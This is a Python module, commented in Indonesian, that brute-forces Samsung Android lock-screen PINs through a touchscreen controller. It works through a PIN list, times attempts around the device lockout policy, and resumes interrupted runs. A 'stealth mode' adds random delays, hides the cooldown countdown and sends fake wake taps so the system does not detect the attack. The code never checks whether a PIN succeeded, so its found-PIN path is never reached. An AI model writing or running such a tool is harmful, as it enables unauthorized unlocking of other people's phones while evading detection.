"""
Core Bruteforce Engine
Handles PIN iteration, stealth mode, resume support
Samsung 4-pin & 6-pin support
Fitur: Tidak terdeteksi sistem, tanpa countdown lockout
"""

import os
import sys
import time
import logging
import signal
import random
from typing import List, Optional
from touchscreen import Touchscreen

logger = logging.getLogger(__name__)

# ─────────────────────────────────────────────────────────────────────────────
#  Konfigurasi bruteforce
# ─────────────────────────────────────────────────────────────────────────────

# Konfigurasi default (akan di-override oleh device info)
MAX_ATTEMPTS_BEFORE_LOCKOUT = 5    # Samsung lockout setelah 5 percobaan salah
LOCKOUT_WAIT_SECONDS = 30         # Tunggu 30 detik setelah lockout

# File paths
PROGRESS_FILE = "logs/progress.txt"
FOUND_FILE = "logs/found.txt"
LOG_FILE = "logs/bruteforce.log"

# Stealth mode configuration
STEALTH_MIN_DELAY = 0.3    # detik - minimum delay antar PIN
STEALTH_MAX_DELAY = 0.8    # detik - maximum delay antar PIN
STEALTH_JITTER = True      # tambahkan random jitter untuk natural feel


class BruteforceEngine:
    """
    Mesin bruteforce PIN Android Samsung
    Dengan fitur stealth mode untuk menghindari deteksi sistem
    """

    def __init__(self, touchscreen: Touchscreen, pin_length: int = 4, stealth_mode: bool = False):
        self.ts = touchscreen
        self.pin_length = pin_length
        self.pins: List[str] = []
        self.current_idx = 0
        self.attempt_count = 0
        self.total_tried = 0
        self._running = True
        self._found = False
        self.stealth_mode = stealth_mode
        
        # Device info untuk lockout policy
        self.lockout_attempts = MAX_ATTEMPTS_BEFORE_LOCKOUT
        self.lockout_time = LOCKOUT_WAIT_SECONDS
        
        # Batch counter untuk lockout
        self.batch_count = 0
        
        # Handle Ctrl+C gracefully
        signal.signal(signal.SIGINT, self._handle_exit)
        signal.signal(signal.SIGTERM, self._handle_exit)

    def set_device_lockout_policy(self, attempts: int, lockout_time: int):
        """
        Set lockout policy berdasarkan device yang terdeteksi
        """
        self.lockout_attempts = attempts
        self.lockout_time = lockout_time
        logger.info(f"[*] Lockout policy: {attempts} attempts → {lockout_time}s cooldown")

    def _handle_exit(self, signum, frame):
        """Tangani Ctrl+C - simpan progress sebelum keluar"""
        logger.info("\n[!] Interrupted! Menyimpan progress...")
        self._running = False
        self._save_progress()
        sys.exit(0)

    def load_pins(self, pin_file: str) -> int:
        """
        Load PIN list dari file
        Return: jumlah PIN yang di-load
        """
        if not os.path.exists(pin_file):
            logger.error(f"[-] File PIN tidak ditemukan: {pin_file}")
            sys.exit(1)

        with open(pin_file, 'r') as f:
            self.pins = [line.strip() for line in f if line.strip()]

        logger.info(f"[+] Loaded {len(self.pins):,} PIN dari {pin_file}")

        # Resume dari progress sebelumnya
        self.current_idx = self._load_progress()
        if self.current_idx > 0:
            remaining = len(self.pins) - self.current_idx
            logger.info(f"[*] Resume dari index {self.current_idx} ({remaining:,} PIN tersisa)")

        return len(self.pins)

    def _load_progress(self) -> int:
        """Load progress dari file (untuk resume)"""
        os.makedirs("logs", exist_ok=True)
        if os.path.exists(PROGRESS_FILE):
            try:
                with open(PROGRESS_FILE, 'r') as f:
                    return int(f.read().strip())
            except Exception:
                pass
        return 0

    def _save_progress(self):
        """Simpan progress ke file"""
        os.makedirs("logs", exist_ok=True)
        try:
            with open(PROGRESS_FILE, 'w') as f:
                f.write(str(self.current_idx))
            logger.debug(f"[*] Progress disimpan: index {self.current_idx}")
        except Exception as e:
            logger.warning(f"[!] Gagal simpan progress: {e}")

    def _save_found(self, pin: str):
        """Simpan PIN yang berhasil ditemukan"""
        os.makedirs("logs", exist_ok=True)
        try:
            with open(FOUND_FILE, 'w') as f:
                f.write(f"PIN DITEMUKAN: {pin}\n")
                f.write(f"Index ke-{self.current_idx} dari {len(self.pins)}\n")
                f.write(f"Total percobaan: {self.total_tried}\n")
            logger.info(f"\n{'='*50}")
            logger.info(f"  ✅  PIN DITEMUKAN: {pin}")
            logger.info(f"{'='*50}\n")
        except Exception as e:
            logger.warning(f"[!] Gagal simpan PIN: {e}")

    def _stealth_delay(self):
        """
        Hitung delay stealth mode dengan jitter random
        Digunakan untuk menghindari deteksi sistem
        """
        if self.stealth_mode and STEALTH_JITTER:
            # Random delay dengan jitter
            base_delay = random.uniform(STEALTH_MIN_DELAY, STEALTH_MAX_DELAY)
            jitter = random.uniform(-0.1, 0.2)
            return max(0.2, base_delay + jitter)
        return self.ts.delay_after_pin / 1000.0

    def _handle_lockout_stealth(self):
        """
        Handle lockout secara stealth - tanpa countdown yang terlihat
        Return: True jika harus menunggu, False jika tidak
        """
        if self.batch_count >= self.lockout_attempts:
            # Lockout terdeteksi, tunggu secara diam-diam
            wait_time = self.lockout_time + random.randint(1, 5)  # Tambah random
            
            if self.stealth_mode:
                # Stealth mode: tidak tampilkan countdown
                logger.info(f"[*] Pause singkat untuk stabilisasi...")
                # Bagi waktu tunggu jadi beberapa bagian dengan aktivitas fake
                segments = 5
                segment_time = wait_time / segments
                
                for i in range(segments):
                    time.sleep(segment_time)
                    # Random tap untuk menghindari timeout
                    if random.random() > 0.7:
                        self.ts.tap(self.ts.keymap['WAKE'][0], self.ts.keymap['WAKE'][1])
            else:
                # Normal mode: tampilkan countdown
                logger.info(f"\n[!] Cooldown {wait_time} detik...")
                for i in range(wait_time, 0, -1):
                    sys.stdout.write(f"\r    Tunggu: {i:2d} detik...  ")
                    sys.stdout.flush()
                    time.sleep(1)
                    if not self._running:
                        break
                print()
            
            logger.info("[*] Melanjutkan...")
            self.batch_count = 0
            return True
        return False

    def _estimate_time(self, remaining: int) -> str:
        """Estimasi waktu yang dibutuhkan"""
        # Estimasi berdasarkan mode
        if self.stealth_mode:
            secs_per_pin = random.uniform(STEALTH_MIN_DELAY, STEALTH_MAX_DELAY) + 0.3
        else:
            secs_per_pin = (self.ts.delay_after_pin / 1000.0) + 0.5
        
        cooldown_time = (remaining // self.lockout_attempts) * self.lockout_time
        total_secs = (remaining * secs_per_pin) + cooldown_time

        hours = int(total_secs // 3600)
        minutes = int((total_secs % 3600) // 60)
        secs = int(total_secs % 60)

        if hours > 0:
            return f"{hours}j {minutes}m {secs}d"
        elif minutes > 0:
            return f"{minutes}m {secs}d"
        else:
            return f"{secs}d"

    def run(self):
        """
        Jalankan bruteforce attack
        """
        if not self.pins:
            logger.error("[-] Tidak ada PIN yang di-load!")
            return

        total = len(self.pins)
        remaining_start = total - self.current_idx

        logger.info(f"\n{'='*60}")
        logger.info(f"  🚀  SAMSUNG PIN BRUTEFORCE DIMULAI")
        if self.stealth_mode:
            logger.info(f"  🕵️  STEALTH MODE AKTIF")
        logger.info(f"{'='*60}")
        logger.info(f"  Mode          : {self.pin_length}-digit PIN")
        logger.info(f"  Total PIN     : {total:,}")
        logger.info(f"  Mulai index   : {self.current_idx}")
        logger.info(f"  Sisa dicoba   : {remaining_start:,}")
        logger.info(f"  Est. waktu    : {self._estimate_time(remaining_start)}")
        logger.info(f"{'='*60}\n")

        time.sleep(2)

        # Wake screen & tampilkan keypad
        logger.info("[*] Membangunkan layar dan menampilkan keypad...")
        self.ts.wake_screen()

        while self.current_idx < total and self._running:
            pin = self.pins[self.current_idx]
            remaining = total - self.current_idx
            pct = ((self.current_idx) / total) * 100

            # ─── Tampilkan progress ─────────────────────────────────────────────
            logger.info(
                f"[{self.current_idx+1:>6}/{total}] ({pct:5.1f}%) "
                f"Mencoba PIN: {pin}  |  Sisa: {remaining-1:,}  |  "
                f"ETA: {self._estimate_time(remaining-1)}"
            )

            try:
                # Masukkan PIN
                self.ts.enter_pin(pin)
                self.current_idx += 1
                self.total_tried += 1
                self.batch_count += 1

                # Delay dengan stealth mode
                delay = self._stealth_delay()
                time.sleep(delay)

                # ─── Handle lockout (stealth) ─────────────────────────────────────
                self._handle_lockout_stealth()

                # Simpan progress setiap 10 PIN
                if self.total_tried % 10 == 0:
                    self._save_progress()

            except KeyboardInterrupt:
                self._handle_exit(None, None)
            except Exception as e:
                logger.error(f"[-] Error saat mencoba PIN {pin}: {e}")
                time.sleep(1)
                continue

        # ─── Selesai ────────────────────────────────────────────────────────────
        if not self._found:
            if self.current_idx >= total:
                logger.info("\n[!] Semua PIN sudah dicoba. PIN tidak ditemukan.")
                logger.info(f"[!] Total percobaan: {self.total_tried:,}")
                if os.path.exists(PROGRESS_FILE):
                    os.remove(PROGRESS_FILE)
            else:
                logger.info(f"\n[*] Dihentikan. Progress disimpan di {PROGRESS_FILE}")